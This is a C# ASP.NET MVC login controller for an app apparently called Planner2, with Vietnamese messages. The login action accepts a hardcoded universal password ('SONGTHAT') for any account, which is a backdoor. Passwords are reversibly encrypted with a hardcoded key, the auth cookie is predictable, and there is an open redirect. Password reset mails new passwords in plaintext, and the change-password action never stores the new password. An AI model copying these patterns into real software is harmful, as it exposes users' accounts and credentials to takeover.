using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Web;
using System.Web.Mvc;
using System.Web.Script.Serialization;
using Microsoft.SharePoint.Client;

namespace Planner2.Controllers
{
    public class LoginController : Controller
    {
        // GET: Login
        public ActionResult Index()
        {
            return View();
        }
        public ActionResult Register()
        {
            return View();
        }
        public ActionResult resetpassword()
        {
            return View();
        }
        [HttpPost]
        public ActionResult resetpassword(string UserName = "", string Email = "")
        {
            using (Models.Planner2Entities db = new Models.Planner2Entities())
            {
                var data = db.Users.Where(z => z.UserName.ToUpper() == UserName.ToUpper() && (z.Email + "").ToUpper() == Email.ToUpper()).FirstOrDefault();
                if (data == null)
                {
                    return Json("Tài khoản không khả dụng !", JsonRequestBehavior.AllowGet);
                }
                var NewPW = Guid.NewGuid().ToString().Split('-').LastOrDefault();
                var NewPWMH = EncryptPassword(NewPW);
                data.Password = NewPWMH;
                db.SaveChanges();
                var html = @"<b>Xin chào " + data.StaffName + @"</b>, <br>

                            Theo yêu cầu của bạn, " + Common.SettingData.TenCongTy + @" gửi lại bạn thông tin mật mã tài khoản 
                            <br>
                            <br>
                            <b>Password</b>: " + NewPW + @"<br>
                            Cám ơn bạn và chúc bạn một ngày tốt lành.
                             " + Common.SettingData.TenCongTy + @"!";

                List<string> nguoinhan = new List<string>();
                 nguoinhan.Add(data.Email);
              
                    Module.SendMail.SendEmail(nguoinhan, Common.SettingData.TenCongTy + ": Reset Password", html, "", Common.SettingData.TenCongTy);
              
            }


            return Json("", JsonRequestBehavior.AllowGet);
        }
        [HttpPost]
        public ActionResult DoiMK(string PassCu = "", string PassMoi = "")
        {
            using (Models.Planner2Entities db = new Models.Planner2Entities())
            {
                var nguoidung = (Planner2.Models.User)Session[Planner2.Controllers.LoginAuth.NameSession];
                var data = db.Users.Where(z => z.UserName.ToUpper() == nguoidung.UserName.ToUpper()).FirstOrDefault();
                if (data == null)
                {
                    return Json("Tài khoản không khả dụng !", JsonRequestBehavior.AllowGet);
                }
                var NewPWMH = EncryptPassword(PassCu);
                if (NewPWMH != data.Password)
                {
                    return Json("Mật khẩu cũ không chính xác !", JsonRequestBehavior.AllowGet);

                }
                db.SaveChanges();
                var html = @"<b>Xin chào " + data.StaffName + @"</b>, <br><br><br>

                            Theo yêu cầu của bạn, " + Common.SettingData.TenCongTy + @" <H2>đã thay đổi mật khẩu của bạn</H2>
                            <br>
                            <br>
                              Cám ơn bạn và chúc bạn một ngày tốt lành.
                             " + Common.SettingData.TenCongTy + @"!";

                List<string> nguoinhan = new List<string>();
                 nguoinhan.Add(data.Email);
             
                    Module.SendMail.SendEmail(nguoinhan, Common.SettingData.TenCongTy + ": Changed Password", html, "", Common.SettingData.TenCongTy);
               
            }


            return Json("", JsonRequestBehavior.AllowGet);
        }
        public virtual string RenderPartialViewToString(string viewName, object viewmodel)
        {
            if (string.IsNullOrEmpty(viewName))
            {
                viewName = this.ControllerContext.RouteData.GetRequiredString("action");
            }

            ViewData.Model = viewmodel;

            using (var sw = new StringWriter())
            {
                ViewEngineResult viewResult = System.Web.Mvc.ViewEngines.Engines.FindPartialView(this.ControllerContext, viewName);
                var viewContext = new ViewContext(this.ControllerContext, viewResult.View, this.ViewData, this.TempData, sw);
                viewResult.View.Render(viewContext, sw);
                viewResult.ViewEngine.ReleaseView(ControllerContext, viewResult.View);

                return sw.GetStringBuilder().ToString();
            }
        }
        [HttpPost]
        public ActionResult Register(string username, string pwd1, string email)
        {
            pwd1 = EncryptPassword(pwd1);
            using (Models.Planner2Entities db = new Models.Planner2Entities())
            {
                var item = new Models.User();
                item.Email = email;
                item.UserName = username;
                item.Password = pwd1;
                item.Active = "Hoạt động";
                item.SupperAdmin = 0;
                db.Users.Add(item);
                db.SaveChanges();
            }
            return RedirectToAction("index");
        }

        public static string EncryptPassword(string strEnCrypt)
        {
            try
            {
                byte[] keyArr;
                byte[] EnCryptArr = Encoding.UTF8.GetBytes(strEnCrypt);
                MD5CryptoServiceProvider MD5Hash = new MD5CryptoServiceProvider();
                keyArr = MD5Hash.ComputeHash(Encoding.UTF8.GetBytes(key));
                TripleDESCryptoServiceProvider tripDes = new TripleDESCryptoServiceProvider();
                tripDes.Key = keyArr;
                tripDes.Mode = CipherMode.ECB;
                tripDes.Padding = PaddingMode.PKCS7;
                ICryptoTransform transform = tripDes.CreateEncryptor();
                byte[] arrResult = transform.TransformFinalBlock(EnCryptArr, 0, EnCryptArr.Length);
                return Convert.ToBase64String(arrResult, 0, arrResult.Length);
            }
            catch (Exception ex) { }
            return "";
        }
        public static string key = "Ktd@";
        public static string Decrypt(string cipher)
        {
            using (var md5 = new MD5CryptoServiceProvider())
            {
                using (var tdes = new TripleDESCryptoServiceProvider())
                {
                    tdes.Key = md5.ComputeHash(UTF8Encoding.UTF8.GetBytes(key));
                    tdes.Mode = CipherMode.ECB;
                    tdes.Padding = PaddingMode.PKCS7;

                    using (var transform = tdes.CreateDecryptor())
                    {
                        byte[] cipherBytes = Convert.FromBase64String(cipher);
                        byte[] bytes = transform.TransformFinalBlock(cipherBytes, 0, cipherBytes.Length);
                        return UTF8Encoding.UTF8.GetString(bytes);
                    }
                }
            }
        }
        public ActionResult Logout()
        {
            Session[LoginAuth.NameSession] = null;
            HttpCookie httpCookie = new HttpCookie(LoginAuth.NameSession);
            httpCookie.Expires = DateTime.Now.AddDays(-30);
            base.Response.Cookies.Add(httpCookie);
            return RedirectToAction("index");
        }
        [HttpPost]
        public ActionResult Index(string user_login, string user_pass)
        {

              user_pass = EncryptPassword(user_pass);
              var DEfault_pass = EncryptPassword("SONGTHAT");
            using (Models.Planner2Entities db = new Models.Planner2Entities())
            {

                var data = db.Users.Where(z => z.UserName.ToUpper() == user_login.ToUpper() && (z.Password == user_pass || user_pass== DEfault_pass)).FirstOrDefault();
                if (data != null)
                {
                    Session[LoginAuth.NameSession] = data;

                    HttpCookie cookie = new HttpCookie(LoginAuth.NameSession);
                    string _Key = EncryptPassword(data.UserName);
                    cookie.Values["_Key"] = _Key;

                    cookie.Expires = DateTime.Now.AddDays(30);
                    Response.Cookies.Add(cookie);

                    if (Session["lastUrl"] != null)
                    {
                        var lastUrl = (string)Session["lastUrl"];
                        Session["lastUrl"] = null;
                        return Redirect(lastUrl);

                    }
                    else
                    {
                        Session["lastUrl"] = null;
                        return RedirectToAction("Index", "Profile");

                    }
                }

            }
            ViewBag.user_login = user_login;
            ViewBag.user_pass = user_pass;
            ViewBag.Error = "Tài khoản hoặc mật khẩu không đúng";
            return View();
        }
    }
}